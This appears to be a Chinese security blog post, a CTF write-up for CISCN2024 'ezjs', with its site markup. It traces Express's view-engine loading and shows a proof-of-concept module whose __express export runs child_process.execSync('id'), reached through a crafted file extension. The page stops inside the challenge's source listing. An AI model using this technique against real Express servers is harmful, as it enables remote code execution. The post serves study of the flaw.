@@ -1,0 +1,641 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.1.1">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css">
+  <script src="/lib/pace/pace.min.js"></script>
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"sun-zzz.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","width":200,"display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="CISCN2024国决一道题的知识点，感觉还挺有意思">
+<meta property="og:type" content="article">
+<meta property="og:title" content="分析Express engine处理引擎的trick">
+<meta property="og:url" content="https://sun-zzz.github.io/article/%E5%88%86%E6%9E%90Express-engine%E5%A4%84%E7%90%86%E5%BC%95%E6%93%8E%E7%9A%84trick.html">
+<meta property="og:site_name" content="rev1ve&#39;s blog">
+<meta property="og:description" content="CISCN2024国决一道题的知识点，感觉还挺有意思">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://sun-zzz.github.io/article/%E5%88%86%E6%9E%90Express-engine%E5%A4%84%E7%90%86%E5%BC%95%E6%93%8E%E7%9A%84trick/image-20240729115446408.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/%E5%88%86%E6%9E%90Express-engine%E5%A4%84%E7%90%86%E5%BC%95%E6%93%8E%E7%9A%84trick/image-20240729121555963.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/%E5%88%86%E6%9E%90Express-engine%E5%A4%84%E7%90%86%E5%BC%95%E6%93%8E%E7%9A%84trick/image-20240729194321522.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/%E5%88%86%E6%9E%90Express-engine%E5%A4%84%E7%90%86%E5%BC%95%E6%93%8E%E7%9A%84trick/image-20240729194740273.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/%E5%88%86%E6%9E%90Express-engine%E5%A4%84%E7%90%86%E5%BC%95%E6%93%8E%E7%9A%84trick/image-20240729194914407.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/%E5%88%86%E6%9E%90Express-engine%E5%A4%84%E7%90%86%E5%BC%95%E6%93%8E%E7%9A%84trick/image-20240729203531653.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/%E5%88%86%E6%9E%90Express-engine%E5%A4%84%E7%90%86%E5%BC%95%E6%93%8E%E7%9A%84trick/image-20240729203902624.png">
+<meta property="article:published_time" content="2024-07-29T03:03:27.000Z">
+<meta property="article:modified_time" content="2024-07-29T13:13:17.053Z">
+<meta property="article:author" content="rev1ve">
+<meta property="article:tag" content="express">
+<meta property="article:tag" content="nodejs">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://sun-zzz.github.io/article/%E5%88%86%E6%9E%90Express-engine%E5%A4%84%E7%90%86%E5%BC%95%E6%93%8E%E7%9A%84trick/image-20240729115446408.png">
+
+<link rel="canonical" href="https://sun-zzz.github.io/article/%E5%88%86%E6%9E%90Express-engine%E5%A4%84%E7%90%86%E5%BC%95%E6%93%8E%E7%9A%84trick.html">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>分析Express engine处理引擎的trick | rev1ve's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">rev1ve's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-links">
+
+    <a href="/links" rel="section"><i class="fas fa-link fa-fw"></i>友链</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://sun-zzz.github.io/article/%E5%88%86%E6%9E%90Express-engine%E5%A4%84%E7%90%86%E5%BC%95%E6%93%8E%E7%9A%84trick.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/1.jpg">
+      <meta itemprop="name" content="rev1ve">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="rev1ve's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          分析Express engine处理引擎的trick
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2024-07-29 11:03:27 / 修改时间：21:13:17" itemprop="dateCreated datePublished" datetime="2024-07-29T11:03:27+08:00">2024-07-29</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/web%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">web安全</span></a>
+                </span>
+            </span>
+
+          
+            <span id="/article/%E5%88%86%E6%9E%90Express-engine%E5%A4%84%E7%90%86%E5%BC%95%E6%93%8E%E7%9A%84trick.html" class="post-meta-item leancloud_visitors" data-flag-title="分析Express engine处理引擎的trick" title="阅读次数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span class="leancloud-visitors-count"></span>
+            </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/article/%E5%88%86%E6%9E%90Express-engine%E5%A4%84%E7%90%86%E5%BC%95%E6%93%8E%E7%9A%84trick.html#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/article/%E5%88%86%E6%9E%90Express-engine%E5%A4%84%E7%90%86%E5%BC%95%E6%93%8E%E7%9A%84trick.html" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>CISCN2024国决一道题的知识点，感觉还挺有意思</p>
+<span id="more"></span>
+
+<h1 id="分析Express-engine处理引擎的trick"><a href="#分析Express-engine处理引擎的trick" class="headerlink" title="分析Express engine处理引擎的trick"></a>分析Express engine处理引擎的trick</h1><h2 id="流程链简析"><a href="#流程链简析" class="headerlink" title="流程链简析"></a>流程链简析</h2><p>当用express的解析模板引擎的时候，即使默认使用了ejs，但是也会有引擎修改的工程</p>
+<p>大概调用链如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">render() -&gt; View() -&gt; tryRender() -&gt; this.engine()</span><br></pre></td></tr></table></figure>
+
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>位置：<code>node_modules\express\lib\application.js</code></p>
+<p>从<code>render()</code>函数开始分析</p>
+<p><img src="/article/%E5%88%86%E6%9E%90Express-engine%E5%A4%84%E7%90%86%E5%BC%95%E6%93%8E%E7%9A%84trick/image-20240729115446408.png"></p>
+<p>接收参数<code>name,options,callback</code>，具体指</p>
+<ul>
+<li><code>name</code>: 视图文件的名称。</li>
+<li><code>options</code>: 渲染选项，可以包含局部变量等。</li>
+<li><code>callback</code>: 可选的回调函数，通常用于处理渲染后的结果。</li>
+</ul>
+<p>如果第二个参数是函数，则将其视为回调，并将<code>options</code>设置为空对象</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">typeof</span> options === <span class="string">&#x27;function&#x27;</span>) &#123;</span><br><span class="line">  done = options;</span><br><span class="line">  opts = &#123;&#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>往下看，如果<code>renderOptions.cache</code>为空，调用<code>enabled()</code>函数判断是否开启<code>view cache</code></p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (renderOptions.<span class="property">cache</span> == <span class="literal">null</span>) &#123;</span><br><span class="line">  renderOptions.<span class="property">cache</span> = <span class="variable language_">this</span>.<span class="title function_">enabled</span>(<span class="string">&#x27;view cache&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>关键代码在下面，由于view在没cache的情况下view变量默认是空的，所以继续调用<code>View()</code>函数</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!view) &#123;</span><br><span class="line">  <span class="keyword">var</span> <span class="title class_">View</span> = <span class="variable language_">this</span>.<span class="title function_">get</span>(<span class="string">&#x27;view&#x27;</span>);</span><br><span class="line"></span><br><span class="line">  view = <span class="keyword">new</span> <span class="title class_">View</span>(name, &#123;</span><br><span class="line">    <span class="attr">defaultEngine</span>: <span class="variable language_">this</span>.<span class="title function_">get</span>(<span class="string">&#x27;view engine&#x27;</span>),</span><br><span class="line">    <span class="attr">root</span>: <span class="variable language_">this</span>.<span class="title function_">get</span>(<span class="string">&#x27;views&#x27;</span>),</span><br><span class="line">    <span class="attr">engines</span>: engines</span><br><span class="line">  &#125;);</span><br></pre></td></tr></table></figure>
+
+<p>跟进一下</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">View</span>(<span class="params">name, options</span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> opts = options || &#123;&#125;;</span><br><span class="line"></span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">defaultEngine</span> = opts.<span class="property">defaultEngine</span>;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">ext</span> = <span class="title function_">extname</span>(name);</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">name</span> = name;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">root</span> = opts.<span class="property">root</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!<span class="variable language_">this</span>.<span class="property">ext</span> &amp;&amp; !<span class="variable language_">this</span>.<span class="property">defaultEngine</span>) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&#x27;No default engine was specified and no extension was provided.&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> fileName = name;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!<span class="variable language_">this</span>.<span class="property">ext</span>) &#123;</span><br><span class="line">    <span class="comment">// get extension from default engine name</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">ext</span> = <span class="variable language_">this</span>.<span class="property">defaultEngine</span>[<span class="number">0</span>] !== <span class="string">&#x27;.&#x27;</span></span><br><span class="line">      ? <span class="string">&#x27;.&#x27;</span> + <span class="variable language_">this</span>.<span class="property">defaultEngine</span></span><br><span class="line">      : <span class="variable language_">this</span>.<span class="property">defaultEngine</span>;</span><br><span class="line"></span><br><span class="line">    fileName += <span class="variable language_">this</span>.<span class="property">ext</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!opts.<span class="property">engines</span>[<span class="variable language_">this</span>.<span class="property">ext</span>]) &#123;</span><br><span class="line">    <span class="comment">// load engine</span></span><br><span class="line">    <span class="keyword">var</span> mod = <span class="variable language_">this</span>.<span class="property">ext</span>.<span class="title function_">slice</span>(<span class="number">1</span>)</span><br><span class="line">    <span class="title function_">debug</span>(<span class="string">&#x27;require &quot;%s&quot;&#x27;</span>, mod)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// default engine export</span></span><br><span class="line">    <span class="keyword">var</span> fn = <span class="built_in">require</span>(mod).<span class="property">__express</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> fn !== <span class="string">&#x27;function&#x27;</span>) &#123;</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&#x27;Module &quot;&#x27;</span> + mod + <span class="string">&#x27;&quot; does not provide a view engine.&#x27;</span>)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    opts.<span class="property">engines</span>[<span class="variable language_">this</span>.<span class="property">ext</span>] = fn</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//省略部分代码   </span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>重点看后面部分，如果<code>opts.engines[this.ext]</code>为空那么调用<code>require()</code>函数</p>
+<p>在这里<code>__express()</code>函数被导入然后定义在<code>opts.engines[this.ext]</code>，也就是说现在engine里有<code>__express()</code>函数</p>
+<p><img src="/article/%E5%88%86%E6%9E%90Express-engine%E5%A4%84%E7%90%86%E5%BC%95%E6%93%8E%E7%9A%84trick/image-20240729121555963.png"></p>
+<p>通过搜索可以知道存在回调函数调用，那么我们就可以用来实现RCE</p>
+<p>现在关键点在于<code>opts.engines[this.ext]</code>是否可控，我们跟进<code>extname()</code>函数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var extname = path.extname;</span><br></pre></td></tr></table></figure>
+
+<p>发现作用就是获取文件拓展名，如果存在类似文件上传那么<code>ext</code>就可控</p>
+<p>我们回到<code>render()</code>函数，在第609行处调用<code>tryRender()</code></p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">tryRender</span>(<span class="params">view, options, callback</span>) &#123;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    view.<span class="title function_">render</span>(options, callback);</span><br><span class="line">  &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">    <span class="title function_">callback</span>(err);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>继续跟进一下<code>view.render()</code></p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">View</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">render</span> = <span class="keyword">function</span> <span class="title function_">render</span>(<span class="params">options, callback</span>) &#123;</span><br><span class="line">  <span class="title function_">debug</span>(<span class="string">&#x27;render &quot;%s&quot;&#x27;</span>, <span class="variable language_">this</span>.<span class="property">path</span>);</span><br><span class="line">  <span class="variable language_">this</span>.<span class="title function_">engine</span>(<span class="variable language_">this</span>.<span class="property">path</span>, options, callback);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<p>最后执行<code>this.engine(this.path, options, callback);</code></p>
+<hr>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>先准备好对应版本的express和ejs</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">npm install express@4.17.2</span><br><span class="line">npm install ejs@3.1.6</span><br></pre></td></tr></table></figure>
+
+<p>我们本地编写demo验证一下，index.js内容如下</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> ejs=<span class="built_in">require</span>(<span class="string">&#x27;ejs&#x27;</span>)</span><br><span class="line"></span><br><span class="line">app=<span class="title function_">express</span>()</span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;view engine&#x27;</span>, <span class="string">&#x27;ejs&#x27;</span>);</span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req,res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> page = req.<span class="property">query</span>.<span class="property">filename</span></span><br><span class="line">    res.<span class="title function_">render</span>(page);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="string">&#x27;3000&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`http://localhost:3000`</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
+
+<p>当对filename传参为不附加后缀的，他会默认使用我们的ejs解析，也就是说</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1/?filename=1</span><br><span class="line">127.0.0.1/?filename=1.ejs    //等价的</span><br></pre></td></tr></table></figure>
+
+<p>当我们键入一个自定义后缀1.aaa时候，会像前文提到的这样处理aaa</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> mod = <span class="variable language_">this</span>.<span class="property">ext</span>.<span class="title function_">slice</span>(<span class="number">1</span>)</span><br><span class="line"><span class="title function_">debug</span>(<span class="string">&#x27;require &quot;%s&quot;&#x27;</span>, mod)</span><br><span class="line"></span><br><span class="line"><span class="comment">// default engine export</span></span><br><span class="line"><span class="keyword">var</span> fn = <span class="built_in">require</span>(mod).<span class="property">__express</span></span><br></pre></td></tr></table></figure>
+
+<p>如果我们有一个文件上传位点可控，并且能把文件传到<code>node_modules</code>下，其实就可以进行<code>__express()</code>函数的使用</p>
+<p>这里我们直接在本地<code>node_modules</code>下建立一个aaa文件夹，添加一个index.js内容如下</p>
+<p>（模拟文件上传功能）</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exports</span>.<span class="property">__express</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).<span class="title function_">execSync</span>(<span class="string">&quot;id&quot;</span>).<span class="title function_">toString</span>());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后键入任意文件名，后缀为aaa即可调用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:3000/?filename=1.aaa</span><br></pre></td></tr></table></figure>
+
+<p>我们可以debug调试看看，不过这里先修改下代码</p>
+<p>位置在<code>node_modules\express\lib\application.js</code>第576行，因为默认<code>view.path</code>为空（实际情况不为空），所以等会调试的时候就会抛出异常，我们先把<code>view.path</code>前面的<code>!</code>去掉，等调试完再添加上去</p>
+<p><img src="/article/%E5%88%86%E6%9E%90Express-engine%E5%A4%84%E7%90%86%E5%BC%95%E6%93%8E%E7%9A%84trick/image-20240729194321522.png"></p>
+<p>准备好后，我们在<code>node_modules\express\lib\view.js</code>第91行下断点</p>
+<p>传参<code>?filename=1.aaa</code>，可以发现engines内容是我们键入的代码</p>
+<p><img src="/article/%E5%88%86%E6%9E%90Express-engine%E5%A4%84%E7%90%86%E5%BC%95%E6%93%8E%E7%9A%84trick/image-20240729194740273.png"></p>
+<p>一步步调试到后面，虽然对照的default是ejs，但我们还是在engine里进行替换了我们要执行的函数</p>
+<p><img src="/article/%E5%88%86%E6%9E%90Express-engine%E5%A4%84%E7%90%86%E5%BC%95%E6%93%8E%E7%9A%84trick/image-20240729194914407.png"></p>
+<hr>
+<h2 id="例题-CISCN2024国决-ezjs"><a href="#例题-CISCN2024国决-ezjs" class="headerlink" title="[例题]CISCN2024国决-ezjs"></a>[例题]CISCN2024国决-ezjs</h2><p>app.js</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span 